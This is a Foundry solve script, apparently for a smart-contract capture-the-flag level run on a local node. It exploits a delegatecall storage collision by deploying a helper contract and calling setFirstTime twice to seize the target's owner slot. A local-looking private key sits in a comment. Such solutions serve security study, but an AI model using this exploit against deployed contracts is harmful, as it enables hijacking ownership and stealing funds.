// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

contract CollisionHelper {
    address one;
    address two;
    address target;

    function setTime(uint256 _time) public {
        target = address(uint160(_time));
    }
}
contract SolveScript is Script {
    address public target = 0x4AE5AF759E17599107c1C688bfaCF6131C376D51;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        CollisionHelper helper = new CollisionHelper();
        console.log("owner : %s", ITarget(target).owner());
        ITarget(target).setFirstTime(uint256(uint160(address(helper))));
        ITarget(target).setFirstTime(uint256(uint160(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)));
        console.log("owner after poc : %s", ITarget(target).owner());
        vm.stopBroadcast();
    }
}
